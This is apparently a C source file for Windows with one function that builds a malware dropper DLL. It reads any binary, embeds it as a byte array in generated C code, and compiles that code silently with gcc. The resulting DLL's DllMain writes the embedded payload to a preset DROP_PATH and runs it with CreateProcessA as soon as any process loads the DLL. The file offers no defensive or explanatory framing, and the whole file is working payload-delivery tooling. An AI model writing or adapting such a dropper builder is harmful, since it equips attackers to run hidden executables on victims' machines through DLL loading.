#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *binary_data = NULL;
    size_t binary_length = 0;
    size_t offset;
    char temp_dir[MAX_PATH];
    char source_path[MAX_PATH];
    char temp_dll_path[MAX_PATH];
    DWORD temp_dir_length;
    FILE *source = NULL;
    char *command_line = NULL;
    size_t command_capacity;
    size_t output_path_length;
    size_t source_path_length;
    int result = -1;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD exit_code = 1;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0') {
        return -1;
    }

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
                        NULL);
    if (input == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0 ||
        (unsigned long long)file_size.QuadPart > (unsigned long long)SIZE_MAX) {
        goto cleanup;
    }

    binary_length = (size_t)file_size.QuadPart;
    binary_data = (unsigned char *)malloc(binary_length == 0 ? 1 : binary_length);
    if (binary_data == NULL) {
        goto cleanup;
    }

    offset = 0;
    while (offset < binary_length) {
        DWORD bytes_to_read = (binary_length - offset > (size_t)MAXDWORD)
                                  ? MAXDWORD
                                  : (DWORD)(binary_length - offset);
        DWORD bytes_read = 0;

        if (!ReadFile(input, binary_data + offset, bytes_to_read, &bytes_read, NULL) ||
            bytes_read == 0) {
            goto cleanup;
        }
        offset += bytes_read;
    }

    if (!CloseHandle(input)) {
        input = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input = INVALID_HANDLE_VALUE;

    temp_dir_length = GetTempPathA(MAX_PATH, temp_dir);
    if (temp_dir_length == 0 || temp_dir_length >= MAX_PATH) {
        goto cleanup;
    }

    if (GetTempFileNameA(temp_dir, "lnk", 0, source_path) == 0) {
        goto cleanup;
    }
    if (GetTempFileNameA(temp_dir, "dll", 0, temp_dll_path) == 0) {
        DeleteFileA(source_path);
        goto cleanup;
    }
    DeleteFileA(temp_dll_path);

    source = fopen(source_path, "wb");
    if (source == NULL) {
        goto cleanup;
    }

    if (fprintf(source,
                "#include <windows.h>\n"
                "#define DROP_PATH %s\n"
                "static const unsigned char embedded_payload[] = {",
                DROP_PATH) < 0) {
        goto cleanup;
    }

    if (binary_length == 0) {
        if (fputs("0x00", source) == EOF) {
            goto cleanup;
        }
    } else {
        for (offset = 0; offset < binary_length; ++offset) {
            if ((offset % 16) == 0 && fputs("\n", source) == EOF) {
                goto cleanup;
            }
            if (fprintf(source, "0x%02X%s",
                        (unsigned int)binary_data[offset],
                        offset + 1 == binary_length ? "" : ",") < 0) {
                goto cleanup;
            }
        }
    }

    if (fprintf(source,
                "\n};\n"
                "static const unsigned long long embedded_payload_size = %lluULL;\n"
                "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
                "{\n"
                "    (void)instance;\n"
                "    (void)reserved;\n"
                "    if (reason == DLL_PROCESS_ATTACH) {\n"
                "        HANDLE file = CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL, "
                "CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
                "        if (file != INVALID_HANDLE_VALUE) {\n"
                "            unsigned long long offset = 0;\n"
                "            while (offset < embedded_payload_size) {\n"
                "                unsigned long long remaining = embedded_payload_size - offset;\n"
                "                DWORD amount = remaining > 0xFFFFFFFFULL ? "
                "0xFFFFFFFFUL : (DWORD)remaining;\n"
                "                DWORD written = 0;\n"
                "                if (!WriteFile(file, embedded_payload + (size_t)offset, "
                "amount, &written, NULL) || written == 0) {\n"
                "                    break;\n"
                "                }\n"
                "                offset += written;\n"
                "            }\n"
                "            CloseHandle(file);\n"
                "        }\n"
                "        {\n"
                "            STARTUPINFOA startup_info;\n"
                "            PROCESS_INFORMATION process_info;\n"
                "            char command_line[] = \"\\\"\" DROP_PATH \"\\\"\";\n"
                "            ZeroMemory(&startup_info, sizeof(startup_info));\n"
                "            ZeroMemory(&process_info, sizeof(process_info));\n"
                "            startup_info.cb = sizeof(startup_info);\n"
                "            if (CreateProcessA(DROP_PATH, command_line, NULL, NULL, FALSE, "
                "0, NULL, NULL, &startup_info, &process_info)) {\n"
                "                CloseHandle(process_info.hThread);\n"
                "                CloseHandle(process_info.hProcess);\n"
                "            }\n"
                "        }\n"
                "    }\n"
                "    return TRUE;\n"
                "}\n",
                (unsigned long long)binary_length) < 0) {
        goto cleanup;
    }

    if (ferror(source) || fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    output_path_length = strlen(dll_out_path);
    source_path_length = strlen(source_path);
    if (output_path_length > SIZE_MAX - source_path_length - 80) {
        goto cleanup;
    }
    command_capacity = output_path_length + source_path_length + 80;
    command_line = (char *)malloc(command_capacity);
    if (command_line == NULL) {
        goto cleanup;
    }

    {
        int command_length = snprintf(command_line, command_capacity,
                                      "\"gcc.exe\" -shared -O2 -s -x c -o \"%s\" \"%s\"",
                                      temp_dll_path, source_path);
        if (command_length < 0 || (size_t)command_length >= command_capacity) {
            goto cleanup;
        }
    }

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &startup_info, &process_info)) {
        goto cleanup;
    }

    CloseHandle(process_info.hThread);
    if (WaitForSingleObject(process_info.hProcess, INFINITE) != WAIT_OBJECT_0 ||
        !GetExitCodeProcess(process_info.hProcess, &exit_code)) {
        CloseHandle(process_info.hProcess);
        goto cleanup;
    }
    CloseHandle(process_info.hProcess);

    if (exit_code != 0 ||
        !MoveFileExA(temp_dll_path, dll_out_path,
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) {
        goto cleanup;
    }

    result = 0;

cleanup:
    if (source != NULL) {
        fclose(source);
    }
    if (input != INVALID_HANDLE_VALUE) {
        CloseHandle(input);
    }
    if (source_path[0] != '\0') {
        DeleteFileA(source_path);
    }
    if (temp_dll_path[0] != '\0') {
        DeleteFileA(temp_dll_path);
    }
    free(command_line);
    free(binary_data);
    return result;
}